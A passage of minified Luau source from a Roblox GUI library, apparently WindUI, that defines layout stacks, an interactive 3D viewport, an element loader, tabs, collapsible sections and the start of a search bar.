al.UIScale,
al.Tab
)



return am.__type,am
end

return ai end function a.X()
local aa=a.load'd'
local af=aa.New

local ai={}

function ai.New(ak,al)
local am={
__type="HStack",
AutoSpace=al.AutoSpace or false,
Elements={},
ElementFrame=nil,
}

local an=af("Frame",{
Size=UDim2.new(1,0,0,0),
BackgroundTransparency=1,
AutomaticSize="Y",
Parent=al.Parent,
},{
af("UIListLayout",{
FillDirection="Horizontal",
HorizontalAlignment="Center",

Padding=UDim.new(0,al.Tab and al.Tab.Gap or(al.Window.NewElements and 1 or 6)),
}),
})

am.ElementFrame=an

local ao=al.ElementsModule
ao.Load(
am,
an,
ao.Elements,
al.Window,
al.WindUI,
function(ap,aq)
local ar=al.Tab and al.Tab.Gap or(al.Window.NewElements and 1 or 6)

local as={}
local at=0

for au,av in next,aq do
if av.__type=="Space"then
at=at+(av.ElementFrame.Size.X.Offset or 6)
elseif av.__type=="Divider"then
at=at+(av.ElementFrame.Size.X.Offset or 1)
else
table.insert(as,av)
end
end

local au=#as
if au==0 then
return
end

local av=1/au

local aw=ar*(au-1)

local ax=-(aw+at)

local ay=math.floor(ax/au)
local az=ax-(ay*au)

for aA,aB in next,as do
local b=ay
if aA<=math.abs(az)then
b=b-1
end

if aB.ElementFrame then
aB.ElementFrame.Size=UDim2.new(av,b,1,0)
end
end
end,
ao,
al.UIScale,
al.Tab
)

if am.AutoSpace then
for ap in next,ao.Elements do
if ap~="Space"and ap~="Divider"then
local aq=am[ap]
am[ap]=function(ar,as)
if#am.Elements>0 then
am:Space()
end
return aq(ar,as)
end
end
end
end

return am.__type,am
end

return ai end function a.Y()

local aa=a.load'd'
local af=aa.New

local ai={}

function ai.New(ak,al)
local am={
__type="VStack",
Elements={},
ElementFrame=nil,
}

local an=af("Frame",{
Size=UDim2.new(1,0,0,0),
BackgroundTransparency=1,
AutomaticSize="Y",
Parent=al.Parent,
},{
af("UIListLayout",{
FillDirection="Vertical",
HorizontalAlignment="Center",

Padding=UDim.new(0,al.Tab and al.Tab.Gap or(al.Window.NewElements and 1 or 6))
}),
})

am.ElementFrame=an

local ao=al.ElementsModule
ao.Load(
am,
an,
ao.Elements,
al.Window,
al.WindUI,







































nil,
ao,
al.UIScale,
al.Tab
)



return am.__type,am
end

return ai end function a.Z()
local aa=(cloneref or clonereference or function(aa)
return aa
end)

local af=aa(game:GetService"UserInputService")

local ai=a.load'd'
local ak=ai.New

local al={}














function al.New(am,an:ConfigType__DARKLUA_TYPE_a)
local ao={
__type="Viewport",
Object=an.Object,
Camera=an.Camera or Instance.new"Camera",
Interactive=an.Interactive or false,
Height=an.Height or 200,
Focused=an.Focused~=false,
}

local ap=false
local aq=false
local ar,as=0

local at=ai.NewRoundFrame(an.Window.ElementConfig.UICorner,"Squircle",{
Size=UDim2.new(1,0,0,ao.Height),
Parent=an.Parent,
ThemeTag={
ImageColor3="ViewportBackground",
ImageTransparency="ViewportBackgroundTransparency",
},
},{
ak("CanvasGroup",{
Size=UDim2.new(1,0,1,0),
BackgroundTransparency=1,
},{
ak("UICorner",{
CornerRadius=UDim.new(0,an.Window.ElementConfig.UICorner),
}),
ak("ViewportFrame",{
Name="Viewport",
Size=UDim2.new(1,0,1,0),
BackgroundTransparency=1,
CurrentCamera=ao.Camera,
Active=ao.Interactive,
},{
ao.Object,
}),
}),
})

local function IsTouchInsideViewport(au)
local av=at.CanvasGroup.Viewport.AbsolutePosition
local aw=at.CanvasGroup.Viewport.AbsoluteSize

return au.X>=av.X
and au.X<=av.X+aw.X
and au.Y>=av.Y
and au.Y<=av.Y+aw.Y
end

local au=an.WindUI.GenerateGUID()

ai.AddSignal(at.CanvasGroup.Viewport.MouseEnter,function()
if ao.Interactive then
an.Tab.UIElements.ContainerFrame.ScrollingEnabled=false
end
end)

ai.AddSignal(at.CanvasGroup.Viewport.InputEnded,function(av)
if
av.UserInputType==Enum.UserInputType.MouseMovement
or av.UserInputType==Enum.UserInputType.Touch
then
an.Tab.UIElements.ContainerFrame.ScrollingEnabled=true
end
end)

ai.AddSignal(at.CanvasGroup.Viewport.InputBegan,function(av)
if ao.Interactive then
if
(av.UserInputType==Enum.UserInputType.MouseButton1)
or(av.UserInputType==Enum.UserInputType.Touch and not aq)
then
if an.WindUI.CurrentInput and an.WindUI.CurrentInput~=au then
return
end

an.WindUI.CurrentInput=au

ap=true
as=av.Position
end
end
end)

ai.AddSignal(af.InputEnded,function(av)
if ao.Interactive then
if
av.UserInputType==Enum.UserInputType.MouseButton1
or av.UserInputType==Enum.UserInputType.Touch
then
if an.WindUI.CurrentInput and an.WindUI.CurrentInput~=au then
return
end

an.WindUI.CurrentInput=nil

ap=false
end
end
end)

ai.AddSignal(af.InputChanged,function(av)
if ao.Interactive and ap and not aq then
if
av.UserInputType==Enum.UserInputType.MouseMovement
or av.UserInputType==Enum.UserInputType.Touch
then
local aw=av.Position-as
as=av.Position

local ax=ao.Object:GetPivot().Position
local ay=ao.Camera

local az=CFrame.fromAxisAngle(Vector3.new(0,1,0),-aw.X*0.02)
ay.CFrame=CFrame.new(ax)*az*CFrame.new(-ax)*ay.CFrame

local aA=CFrame.fromAxisAngle(ay.CFrame.RightVector,-aw.Y*0.02)
local aB=CFrame.new(ax)*aA*CFrame.new(-ax)*ay.CFrame

if aB.UpVector.Y>0.1 then
ay.CFrame=aB
end
end
end
end)

ai.AddSignal(at.CanvasGroup.Viewport.InputChanged,function(av)
if ao.Interactive then
if av.UserInputType==Enum.UserInputType.MouseWheel then
local aw=av.Position.Z*2
ao.Camera.CFrame+=ao.Camera.CFrame.LookVector*aw
end
end
end)

ai.AddSignal(af.TouchPinch,function(av,aw,ax,ay)
if not IsTouchInsideViewport(av[1])or not IsTouchInsideViewport(av[2])then
return
end
if ao.Interactive then
if ay==Enum.UserInputState.Begin then
aq=true
ap=false
ar=(av[1]-av[2]).Magnitude
elseif ay==Enum.UserInputState.Change then
if aq then
local az=(av[1]-av[2]).Magnitude
local aA=(az-ar)*0.03
ar=az
ao.Camera.CFrame+=ao.Camera.CFrame.LookVector*aA
end
elseif ay==Enum.UserInputState.End or ay==Enum.UserInputState.Cancel then
aq=false
end
end
end)

local function FocusCamera()
local av=ao.Object:IsA"BasePart"and ao.Object.Size
or select(2,ao.Object:GetBoundingBox(0))
local aw=math.max(av.X,av.Y,av.Z)
local ax=aw*2
local ay=ao.Object:GetPivot().Position

ao.Camera.CFrame=
CFrame.new(ay+Vector3.new(0,aw/2,ax),ay)
end

if ao.Focused then
FocusCamera()
end

function ao.SetObject(av,aw,ax)
if ax then
aw=aw:Clone()
end
if ao.Object then
ao.Object:Destroy()
end

ao.Object=aw
ao.Object.Parent=at.CanvasGroup.Viewport
end

function ao.SetHeight(av,aw)
at.Size=UDim2.new(1,0,0,aw)
end

function ao.Focus(av)
if ao.Object then
FocusCamera()
end
end

function ao.SetCamera(av,aw)
ao.Camera=aw
at.CanvasGroup.Viewport.CurrentCamera=aw
end

function ao.SetInteractive(av,aw)
ao.Interactive=aw
at.CanvasGroup.Viewport.Active=aw
end

ao.Main=at

return ao.__type,ao
end

return al end function a._()

return{
Elements={
Paragraph=a.load'D',
Button=a.load'E',
Toggle=a.load'H',
Slider=a.load'I',
ProgressBar=a.load'J',
Keybind=a.load'K',
Input=a.load'L',
Dropdown=a.load'O',
Code=a.load'R',
Colorpicker=a.load'S',
Section=a.load'T',
Divider=a.load'M',
Space=a.load'U',
Image=a.load'V',
Group=a.load'W',
HStack=a.load'X',
VStack=a.load'Y',
Viewport=a.load'Z',

},
Load=function(aa,af,ai,ak,al,am,an,ao,ap)
for aq,ar in next,ai do
aa[aq]=function(as,at)
at=at or{}
at.Tab=ap or aa
at.ParentType=aa.__type
at.ParentTable=aa
at.Index=#aa.Elements+1
at.GlobalIndex=#ak.AllElements+1
at.Parent=af
at.Window=ak
at.WindUI=al
at.UIScale=ao
at.ElementsModule=an local

au, av=ar:New(at)

if at.Flag and typeof(at.Flag)=="string"then
if ak.CurrentConfig then
ak.CurrentConfig:Register(at.Flag,av)

if ak.PendingConfigData and ak.PendingConfigData[at.Flag]then
local aw=ak.PendingConfigData[at.Flag]

local ax=ak.ConfigManager
if ax.Parser[aw.__type]then
task.defer(function()
local ay,az=pcall(function()
ax.Parser[aw.__type].Load(av,aw)
end)

if ay then
ak.PendingConfigData[at.Flag]=nil
else
warn(
"[ WindUI ] Failed to apply pending config for '"
..at.Flag
.."': "
..tostring(az)
)
end
end)
end
end
else
ak.PendingFlags=ak.PendingFlags or{}
ak.PendingFlags[at.Flag]=av
end
end

local aw
for ax,ay in next,av do
if typeof(ay)=="table"and ax~="ElementFrame"and ax:match"Frame$"then
aw=ay
break
end
end

if aw then
av.ElementFrame=aw.UIElements.Main
function av.SetTitle(ax,ay)
return aw.SetTitle and aw:SetTitle(ay)
end
function av.SetDesc(ax,ay)
return aw.SetDesc and aw:SetDesc(ay)
end
function av.SetImage(ax,ay,az)
return aw.SetImage and aw:SetImage(ay,az)
end
function av.SetThumbnail(ax,ay,az)
return aw.SetThumbnail and aw:SetThumbnail(ay,az)
end
function av.Highlight(ax)
aw:Highlight()
end
function av.Destroy(ax)
aw:Destroy()

table.remove(ak.AllElements,at.GlobalIndex)
table.remove(aa.Elements,at.Index)
table.remove(ap.Elements,at.Index)
aa:UpdateAllElementShapes(aa)
end
end

ak.AllElements[at.Index]=av
aa.Elements[at.Index]=av
if ap then
ap.Elements[at.Index]=av
end

if ak.NewElements then
aa:UpdateAllElementShapes(aa)
end

if am then
am(av,aa.Elements)
end
return av
end
end
function aa.UpdateAllElementShapes(aq,ar)
for as,at in next,ar.Elements do
local au
for av,aw in pairs(at)do
if typeof(aw)=="table"and av:match"Frame$"then
au=aw
break
end
end

if not au and at.UpdateShape then
au=at
end

if au then

au.Index=as
if au.UpdateShape then

au.UpdateShape(ar)
end
end
end
end
end,
}end function a.aa()

local aa=(cloneref or clonereference or function(aa)
return aa
end)

local af=game:GetService"Players"

aa(game:GetService"UserInputService")
local ai=af.LocalPlayer:GetMouse()

local ak=a.load'd'
local al=ak.New

local am=a.load'B'.New
local an=a.load'x'.New



local ao={


Tabs={},
Containers={},
SelectedTab=nil,
TabCount=0,
ToolTipParent=nil,
TabHighlight=nil,

OnChangeFunc=function(ao)end,
}

function ao.Init(ap,aq,ar,as)
Window=ap
WindUI=aq
ao.ToolTipParent=ar
ao.TabHighlight=as
return ao
end

function ao.New(ap,aq)
local ar={
__type="Tab",
Title=ap.Title or"Tab",
Desc=ap.Desc,
Icon=ap.Icon,
IconColor=ap.IconColor,
IconShape=ap.IconShape,
IconThemed=ap.IconThemed,
Locked=ap.Locked,
ShowTabTitle=ap.ShowTabTitle,
TabTitleAlign=ap.TabTitleAlign or"Left",
CustomEmptyPage=(ap.CustomEmptyPage and next(ap.CustomEmptyPage)~=nil)and ap.CustomEmptyPage
or{Icon="lucide:frown",IconSize=48,Title="This tab is Empty",Desc=nil},
Border=ap.Border,
Selected=false,
Index=nil,
Parent=ap.Parent,
UIElements={},
Elements={},
ContainerFrame=nil,
UICorner=Window.UICorner-(Window.UIPadding/2),

Gap=Window.NewElements and 1 or 6,

TabPaddingX=4+(Window.UIPadding/2),
TabPaddingY=3+(Window.UIPadding/2),
TitlePaddingY=0,
}









if ar.IconShape then
ar.TabPaddingX=2+(Window.UIPadding/4)
ar.TabPaddingY=2+(Window.UIPadding/4)
ar.TitlePaddingY=2+(Window.UIPadding/4)
end

ao.TabCount=ao.TabCount+1

local as=ao.TabCount
ar.Index=as

ar.UIElements.Main=ak.NewRoundFrame(ar.UICorner,"Squircle",{
BackgroundTransparency=1,
Size=UDim2.new(1,-7,0,0),
AutomaticSize="Y",
Parent=ap.Parent,
ThemeTag={
ImageColor3="TabBackground",
},
ImageTransparency=1,
},{
ak.NewRoundFrame(ar.UICorner-1,"Glass-1.4",{
Size=UDim2.new(1,1,1,1),
ThemeTag={
ImageColor3="TabBorder",
},
AnchorPoint=Vector2.new(0.5,0.5),
Position=UDim2.new(0.5,0,0.5,0),
ImageTransparency=1,
Name="Outline",
},{













}),
ak.NewRoundFrame(ar.UICorner,"Squircle",{
Size=UDim2.new(1,0,0,0),
AutomaticSize="Y",
ThemeTag={
ImageColor3="Text",
},
ImageTransparency=1,
Name="Frame",
},{
al("UIListLayout",{
SortOrder="LayoutOrder",
Padding=UDim.new(0,2+(Window.UIPadding/2)),
FillDirection="Horizontal",
VerticalAlignment="Center",
}),
al("TextLabel",{
Text=ar.Title,
ThemeTag={
TextColor3="TabTitle",
},
TextTransparency=not ar.Locked and 0.4 or 0.7,
TextSize=15,
Size=UDim2.new(1,0,0,0),
FontFace=Font.new(ak.Font,Enum.FontWeight.Medium),
TextWrapped=true,
RichText=true,
AutomaticSize="Y",
LayoutOrder=2,
TextXAlignment="Left",
BackgroundTransparency=1,
},{
al("UIPadding",{
PaddingTop=UDim.new(0,ar.TitlePaddingY),


PaddingBottom=UDim.new(0,ar.TitlePaddingY),
}),
}),
al("UIPadding",{
PaddingTop=UDim.new(0,ar.TabPaddingY),
PaddingLeft=UDim.new(0,ar.TabPaddingX),
PaddingRight=UDim.new(0,ar.TabPaddingX),
PaddingBottom=UDim.new(0,ar.TabPaddingY),
}),
}),
},true)

local at=0
local au
local av

if ar.Icon then
au=ak.Image(
ar.Icon,
ar.Icon..":"..ar.Title,
0,
Window.Folder,
ar.__type,
ar.IconColor and false or true,
ar.IconThemed,
"TabIcon"
)
au.Size=UDim2.new(0,16,0,16)
if ar.IconColor then
au.ImageLabel.ImageColor3=ar.IconColor
end
if not ar.IconShape then
au.Parent=ar.UIElements.Main.Frame
ar.UIElements.Icon=au
au.ImageLabel.ImageTransparency=not ar.Locked and 0 or 0.7
at=-18-(Window.UIPadding/2)
ar.UIElements.Main.Frame.TextLabel.Size=UDim2.new(1,at,0,0)
elseif ar.IconColor then
ak.NewRoundFrame(
ar.IconShape~="Circle"and(ar.UICorner+5-(2+(Window.UIPadding/4)))or 9999,
"Squircle",
{
Size=UDim2.new(0,26,0,26),
ImageColor3=ar.IconColor,
Parent=ar.UIElements.Main.Frame,
},
{
au,
ak.NewRoundFrame(
ar.IconShape~="Circle"and(ar.UICorner+5-(2+(Window.UIPadding/4)))or 9999,
"Glass-1.4",
{
Size=UDim2.new(1,0,1,0),
ThemeTag={
ImageColor3="White",
},
ImageTransparency=0,
Name="Outline",
},
{













}
),
}
)
au.AnchorPoint=Vector2.new(0.5,0.5)
au.Position=UDim2.new(0.5,0,0.5,0)
au.ImageLabel.ImageTransparency=0
au.ImageLabel.ImageColor3=ak.GetTextColorForHSB(ar.IconColor,0.68)
at=-28-(Window.UIPadding/2)
ar.UIElements.Main.Frame.TextLabel.Size=UDim2.new(1,at,0,0)
end

av=
ak.Image(ar.Icon,ar.Icon..":"..ar.Title,0,Window.Folder,ar.__type,true,ar.IconThemed)
av.Size=UDim2.new(0,16,0,16)
av.ImageLabel.ImageTransparency=not ar.Locked and 0 or 0.7
at=-30




end

ar.UIElements.ContainerFrame=al("ScrollingFrame",{
Size=UDim2.new(1,0,1,ar.ShowTabTitle and-((Window.UIPadding*2.4)+12)or 0),
BackgroundTransparency=1,
ScrollBarThickness=0,
ElasticBehavior="Never",
CanvasSize=UDim2.new(0,0,0,0),
AnchorPoint=Vector2.new(0,1),
Position=UDim2.new(0,0,1,0),
AutomaticCanvasSize="Y",

ScrollingDirection="Y",
},{
al("UIPadding",{
PaddingTop=UDim.new(0,not Window.HidePanelBackground and 20 or 10),
PaddingLeft=UDim.new(0,not Window.HidePanelBackground and 20 or 10),
PaddingRight=UDim.new(0,not Window.HidePanelBackground and 20 or 10),
PaddingBottom=UDim.new(0,not Window.HidePanelBackground and 20 or 10),
}),
al("UIListLayout",{
SortOrder="LayoutOrder",
Padding=UDim.new(0,ar.Gap),
HorizontalAlignment="Center",
}),
})





ar.UIElements.ContainerFrameCanvas=al("Frame",{
Size=UDim2.new(1,0,1,0),
BackgroundTransparency=1,
Visible=false,
Parent=Window.UIElements.MainBar,
ZIndex=5,
},{
ar.UIElements.ContainerFrame,
al("Frame",{
Size=UDim2.new(1,-14,1,-14),
Position=UDim2.new(0.5,0,0.5,0),
AnchorPoint=Vector2.new(0.5,0.5),
BackgroundTransparency=1,
Name="ScrollSliderHolder",
}),
al("Frame",{
Size=UDim2.new(1,0,0,((Window.UIPadding*2.4)+12)),
BackgroundTransparency=1,
Visible=ar.ShowTabTitle or false,
Name="TabTitle",
},{
av,
al("TextLabel",{
Text=ar.Title,
ThemeTag={
TextColor3="Text",
},
TextSize=20,
TextTransparency=0.1,
Size=UDim2.new(0,0,1,0),
FontFace=Font.new(ak.Font,Enum.FontWeight.SemiBold),

RichText=true,
LayoutOrder=2,
TextXAlignment="Left",
BackgroundTransparency=1,
AutomaticSize="X",
}),
al("UIPadding",{
PaddingTop=UDim.new(0,20),
PaddingLeft=UDim.new(0,20),
PaddingRight=UDim.new(0,20),
PaddingBottom=UDim.new(0,20),
}),
al("UIListLayout",{
SortOrder="LayoutOrder",
Padding=UDim.new(0,10),
FillDirection="Horizontal",
VerticalAlignment="Center",
HorizontalAlignment=ar.TabTitleAlign,
}),
}),
al("Frame",{
Size=UDim2.new(1,0,0,1),
BackgroundTransparency=0.9,
ThemeTag={
BackgroundColor3="Text",
},
Position=UDim2.new(0,0,0,((Window.UIPadding*2.4)+12)),
Visible=ar.ShowTabTitle or false,
}),
})

ao.Containers[as]=ar.UIElements.ContainerFrameCanvas
ao.Tabs[as]=ar

ar.ContainerFrame=ar.UIElements.ContainerFrameCanvas

ak.AddSignal(ar.UIElements.Main.MouseButton1Click,function()
if not ar.Locked then
ao:SelectTab(as)
end
end)

if Window.ScrollBarEnabled then
an(
ar.UIElements.ContainerFrame,
ar.UIElements.ContainerFrameCanvas.ScrollSliderHolder,
Window,
4,
WindUI
)
end

local aw
local ax
local ay
local az=false


if ar.Desc then
ak.AddSignal(ar.UIElements.Main.InputBegan,function()
az=true
ax=task.spawn(function()
task.wait(0.35)
if az and not aw then
aw=am(ar.Desc,ao.ToolTipParent,true)
aw.Container.AnchorPoint=Vector2.new(0.5,0.5)

local function updatePosition()
if aw then
aw.Container.Position=UDim2.new(0,ai.X,0,ai.Y-4)
end
end

updatePosition()
ay=ai.Move:Connect(updatePosition)
aw:Open()
end
end)
end)
end

ak.AddSignal(ar.UIElements.Main.MouseEnter,function()
if not ar.Locked then
ak.SetThemeTag(ar.UIElements.Main.Frame,{
ImageTransparency="TabBackgroundHoverTransparency",
ImageColor3="TabBackgroundHover",
},0.1)
end
end)
ak.AddSignal(ar.UIElements.Main.InputEnded,function()
if ar.Desc then
az=false
if ax then
task.cancel(ax)
ax=nil
end
if ay then
ay:Disconnect()
ay=nil
end
if aw then
aw:Close()
aw=nil
end
end

if not ar.Locked then
ak.SetThemeTag(ar.UIElements.Main.Frame,{
ImageTransparency="TabBorderTransparency",
},0.1)
end
end)

function ar.ScrollToTheElement(aA,aB)
ar.UIElements.ContainerFrame.ScrollingEnabled=false

ak.Tween(ar.UIElements.ContainerFrame,0.45,{
CanvasPosition=Vector2.new(
0,
ar.Elements[aB].ElementFrame.AbsolutePosition.Y
-ar.UIElements.ContainerFrame.AbsolutePosition.Y
-ar.UIElements.ContainerFrame.UIPadding.PaddingTop.Offset
),
},Enum.EasingStyle.Quint,Enum.EasingDirection.Out):Play()

task.spawn(function()
task.wait(0.48)

if ar.Elements[aB].Highlight then
ar.Elements[aB]:Highlight()
end
ar.UIElements.ContainerFrame.ScrollingEnabled=true
end)

return ar
end



local aA=a.load'_'

aA.Load(
ar,
ar.UIElements.ContainerFrame,
aA.Elements,
Window,
WindUI,
nil,
aA,
aq,
ar
)

function ar.LockAll(aB)

for b,d in next,Window.AllElements do
if d.Tab and d.Tab.Index and d.Tab.Index==ar.Index and d.Lock then
d:Lock()
end
end
end
function ar.UnlockAll(aB)
for b,d in next,Window.AllElements do
if d.Tab and d.Tab.Index and d.Tab.Index==ar.Index and d.Unlock then
d:Unlock()
end
end
end
function ar.GetLocked(aB)
local b={}

for d,f in next,Window.AllElements do
if f.Tab and f.Tab.Index and f.Tab.Index==ar.Index and f.Locked==true then
table.insert(b,f)
end
end

return b
end
function ar.GetUnlocked(aB)
local b={}

for d,f in next,Window.AllElements do
if f.Tab and f.Tab.Index and f.Tab.Index==ar.Index and f.Locked==false then
table.insert(b,f)
end
end

return b
end

function ar.Select(aB)
return ao:SelectTab(ar.Index)
end

task.spawn(function()
local aB
if ar.CustomEmptyPage.Icon then
aB=
ak.Image(ar.CustomEmptyPage.Icon,ar.CustomEmptyPage.Icon,0,"Temp","EmptyPage",true)
aB.Size=
UDim2.fromOffset(ar.CustomEmptyPage.IconSize or 48,ar.CustomEmptyPage.IconSize or 48)
end

local b=al("Frame",{
BackgroundTransparency=1,
Size=UDim2.new(1,0,1,-Window.UIElements.Main.Main.Topbar.AbsoluteSize.Y),
Parent=ar.UIElements.ContainerFrame,
},{
al("UIListLayout",{
Padding=UDim.new(0,8),
SortOrder="LayoutOrder",
VerticalAlignment="Center",
HorizontalAlignment="Center",
FillDirection="Vertical",
}),











aB,
ar.CustomEmptyPage.Title and al("TextLabel",{
AutomaticSize="XY",
Text=ar.CustomEmptyPage.Title,
ThemeTag={
TextColor3="Text",
},
TextSize=18,
TextTransparency=0.5,
BackgroundTransparency=1,
FontFace=Font.new(ak.Font,Enum.FontWeight.Medium),
})or nil,
ar.CustomEmptyPage.Desc and al("TextLabel",{
AutomaticSize="XY",
Text=ar.CustomEmptyPage.Desc,
ThemeTag={
TextColor3="Text",
},
TextSize=15,
TextTransparency=0.65,
BackgroundTransparency=1,
FontFace=Font.new(ak.Font,Enum.FontWeight.Regular),
})or nil,
})





local d
d=ak.AddSignal(ar.UIElements.ContainerFrame.ChildAdded,function()
b.Visible=false
d:Disconnect()
end)
end)

return ar
end

function ao.OnChange(ap,aq)
ao.OnChangeFunc=aq
end

function ao.SelectTab(ap,aq)
if not ao.Tabs[aq].Locked then
ao.SelectedTab=aq

for ar,as in next,ao.Tabs do
if not as.Locked then
ak.SetThemeTag(as.UIElements.Main,{
ImageTransparency="TabBorderTransparency",
},0.15)
if as.Border then
ak.SetThemeTag(as.UIElements.Main.Outline,{
ImageTransparency="TabBorderTransparency",
},0.15)
end
ak.SetThemeTag(as.UIElements.Main.Frame.TextLabel,{
TextTransparency="TabTextTransparency",
},0.15)
if as.UIElements.Icon and not as.IconColor then
ak.SetThemeTag(as.UIElements.Icon.ImageLabel,{
ImageTransparency="TabIconTransparency",
},0.15)
end
as.Selected=false
end
end
ak.SetThemeTag(ao.Tabs[aq].UIElements.Main,{
ImageColor3="TabBackgroundActive",
ImageTransparency="TabBackgroundActiveTransparency",
},0.15)
if ao.Tabs[aq].Border then
ak.SetThemeTag(ao.Tabs[aq].UIElements.Main.Outline,{
ImageTransparency="TabBorderTransparencyActive",
},0.15)
end
ak.SetThemeTag(ao.Tabs[aq].UIElements.Main.Frame.TextLabel,{
TextTransparency="TabTextTransparencyActive",
},0.15)
if ao.Tabs[aq].UIElements.Icon and not ao.Tabs[aq].IconColor then
ak.SetThemeTag(ao.Tabs[aq].UIElements.Icon.ImageLabel,{
ImageTransparency="TabIconTransparencyActive",
},0.15)
end
ao.Tabs[aq].Selected=true

task.spawn(function()
for ar,as in next,ao.Containers do
as.AnchorPoint=Vector2.new(0,0.05)
as.Visible=false
end
ao.Containers[aq].Visible=true
local ar=game:GetService"TweenService"

local as=TweenInfo.new(0.15,Enum.EasingStyle.Quart,Enum.EasingDirection.Out)
local at=ar:Create(ao.Containers[aq],as,{
AnchorPoint=Vector2.new(0,0),
})
at:Play()
end)

ao.OnChangeFunc(aq)
end
end

return ao end function a.ab()

local aa={}


local af=a.load'd'
local ai=af.New
local ak=af.Tween

local al=a.load'aa'

function aa.New(am,an,ao,ap,aq)
local ar={
Title=am.Title or"Section",
Icon=am.Icon,
IconThemed=am.IconThemed,
Opened=am.Opened or false,

HeaderSize=42,
IconSize=18,

Expandable=false,
}

local as
if ar.Icon then
as=af.Image(
ar.Icon,
ar.Icon,
0,
ao,
"Section",
true,
ar.IconThemed,
"TabSectionIcon"
)

as.Size=UDim2.new(0,ar.IconSize,0,ar.IconSize)
as.ImageLabel.ImageTransparency=.25
end

local at=ai("Frame",{
Size=UDim2.new(0,ar.IconSize,0,ar.IconSize),
BackgroundTransparency=1,
Visible=false
},{
ai("ImageLabel",{
Size=UDim2.new(1,0,1,0),
BackgroundTransparency=1,
Image=af.Icon"chevron-down"[1],
ImageRectSize=af.Icon"chevron-down"[2].ImageRectSize,
ImageRectOffset=af.Icon"chevron-down"[2].ImageRectPosition,
ThemeTag={
ImageColor3="Icon",
},
ImageTransparency=.7,
})
})

local au=ai("Frame",{
Size=UDim2.new(1,0,0,ar.HeaderSize),
BackgroundTransparency=1,
Parent=an,
ClipsDescendants=true,
},{
ai("TextButton",{
Size=UDim2.new(1,0,0,ar.HeaderSize),
BackgroundTransparency=1,
Text="",
},{
as,
ai("TextLabel",{
Text=ar.Title,
TextXAlignment="Left",
Size=UDim2.new(
1,
as and(-ar.IconSize-10)*2
or(-ar.IconSize-10),

1,
0
),
ThemeTag={
TextColor3="Text",
},
FontFace=Font.new(af.Font,Enum.FontWeight.SemiBold),
TextSize=14,
BackgroundTransparency=1,
TextTransparency=.7,

TextWrapped=true
}),
ai("UIListLayout",{
FillDirection="Horizontal",
VerticalAlignment="Center",
Padding=UDim.new(0,10)
}),
at,
ai("UIPadding",{
PaddingLeft=UDim.new(0,11),
PaddingRight=UDim.new(0,11),
})
}),
ai("Frame",{
BackgroundTransparency=1,
Size=UDim2.new(1,0,0,0),
AutomaticSize="Y",
Name="Content",
Visible=true,
Position=UDim2.new(0,0,0,ar.HeaderSize)
},{
ai("UIListLayout",{
FillDirection="Vertical",
Padding=UDim.new(0,aq.Gap),
VerticalAlignment="Bottom",
}),
})
})


function ar.Tab(av,aw)
if not ar.Expandable then
ar.Expandable=true
at.Visible=true
end
aw.Parent=au.Content
return al.New(aw,ap)
end

function ar.Open(av)
if ar.Expandable then
ar.Opened=true
ak(au,0.33,{
Size=UDim2.new(1,0,0,ar.HeaderSize+(au.Content.AbsoluteSize.Y/ap))
},Enum.EasingStyle.Quint,Enum.EasingDirection.Out):Play()

ak(at.ImageLabel,0.1,{Rotation=180},Enum.EasingStyle.Quint,Enum.EasingDirection.Out):Play()
end
end
function ar.Close(av)
if ar.Expandable then
ar.Opened=false
ak(au,0.26,{
Size=UDim2.new(1,0,0,ar.HeaderSize)
},Enum.EasingStyle.Quint,Enum.EasingDirection.Out):Play()
ak(at.ImageLabel,0.1,{Rotation=0},Enum.EasingStyle.Quint,Enum.EasingDirection.Out):Play()
end
end

af.AddSignal(au.TextButton.MouseButton1Click,function()
if ar.Expandable then
if ar.Opened then
ar:Close()
else
ar:Open()
end
end
end)

af.AddSignal(au.Content.UIListLayout:GetPropertyChangedSignal"AbsoluteContentSize",function()
if ar.Opened then
ar:Open()
end
end)

if ar.Opened then
task.spawn(function()
task.wait()
ar:Open()
end)
end



return ar
end


return aa end function a.ac()
return{
Tab="table-of-contents",
Paragraph="type",
Button="square-mouse-pointer",
Toggle="toggle-right",
Slider="sliders-horizontal",
Keybind="command",
Input="text-cursor-input",
Dropdown="chevrons-up-down",
Code="terminal",
Colorpicker="palette",
}end function a.ad()
local aa=(cloneref or clonereference or function(aa)
return aa
end)

aa(game:GetService"UserInputService")

local af={
Margin=8,
Padding=9,
}

local ai=a.load'd'
local ak=ai.New
local al=ai.Tween

function af.new(am,an,ao)
local ap={
IconSize=18,
Padding=14,
Radius=22,
Width=400,
MaxHeight=380,

Icons=a.load'ac',
}

local aq=ak("TextBox",{
Text="",
PlaceholderText="Search...",
ThemeTag={
PlaceholderColor3="Placeholder",
TextColor3="Text",
},
Size=UDim2.new(1,-((ap.IconSize*2)+(ap.Padding*2)),0,0),
AutomaticSize="Y",
ClipsDescendants=true,
ClearTextOnFocus=false,
BackgroundTransparency=1,
TextXAlignment="Left",
FontFace=Font.new(ai.Font,Enum.FontWeight.Regular),
TextSize=18,
})

local ar=ak("ImageLabel",{
Image=ai.Icon"x"[1],
ImageRectSize=ai.Icon"x"[2].ImageRectSize,
ImageRectOffset=ai.Icon"x"[2].ImageRectPosition,
BackgroundTransparency=1,
ThemeTag={
ImageColor3="Icon",
},
ImageTransparency=0.1,
Size=UDim2.new(0,ap.IconSize,0,ap.IconSize),
},{
ak("TextButton",{
Size=UDim2.new(1,8,1,8),
BackgroundTransparency=1,
Active=true,
ZIndex=999999999,
AnchorPoint=Vector2.new(0.5,0.5),
Position=UDim2.new(0.5,0,0.5,0),
Text="",
}),
})

local as=ak("ScrollingFrame",{
Size=UDim2.new(1,0,0,0),
AutomaticCanvasSize="Y",
ScrollingDirection="Y",
ElasticBehavior="Never",
ScrollBarThickness=0,
CanvasSize=UDim2.new(0,0,0,0),
BackgroundTransparency=1,
Visible=false,
},{
ak("UIListLayout",{
Padding=UDim.new(0,0),
FillDirection="Vertical",
}),
ak("UIPadding",{
PaddingTop=UDim.new(0,ap.Padding),
PaddingLeft=UDim.new(0,ap.Padding),
PaddingRight=UDim.new(0,ap.Padding),
PaddingBottom=UDim.new(0,ap.Padding),
}),
})

local at=ai.NewRoundFrame(ap.Radius,"Squircle",{
Size=UDim2.new(1,0,1,0),
ThemeTag={
ImageColor3="WindowSearchBarBackground",
},
ImageTransparency=0,
},{
ai.NewRoundFrame(ap.Radius,"Squircle",{
Size=UDim2.new(1,0,1,0),
BackgroundTransparency=1,

Visible=false,
ThemeTag={
ImageColor3="White",
},
ImageTransparency=1,
Name="Frame",
},{
ak("Frame",{
Size=UDim2.new(1,0,0,46),
BackgroundTransparency=1,
},{








